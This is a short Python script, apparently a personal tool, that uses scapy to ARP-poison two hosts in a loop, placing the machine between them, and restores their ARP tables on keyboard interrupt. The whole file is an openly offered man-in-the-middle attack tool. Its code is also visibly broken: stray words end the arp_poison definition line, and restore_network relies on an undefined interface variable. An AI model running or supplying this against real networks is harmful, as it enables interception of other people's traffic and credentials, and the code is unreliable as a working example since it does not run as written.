# Arp poisoner written in scapy, runs until keyboard interrupt
# Author: Maxwell Bland, 07-09-2018

from scapy.all import *


def restore_network(A_IP, A_MAC, B_IP, B_MAC):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=A_IP, hwsrc=B_MAC, psrc=B_IP), count=5, iface=interface)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=B_IP, hwsrc=A_MAC, psrc=A_IP), count=5, iface=interface)


def arp_poison(A_IP, A_MAC, B_IP, B_MAC, interface):get IP address
    try:
        while True:
            send(ARP(op=2, pdst=A_IP, hwdst=A_MAC, psrc=B_IP), iface=interface)
            send(ARP(op=2, pdst=B_IP, hwdst=B_MAC, psrc=A_IP), iface=interface)
            time.sleep(2)
    except KeyboardInterrupt:
        restore_network(A_IP, A_MAC, B_IP, B_MAC)
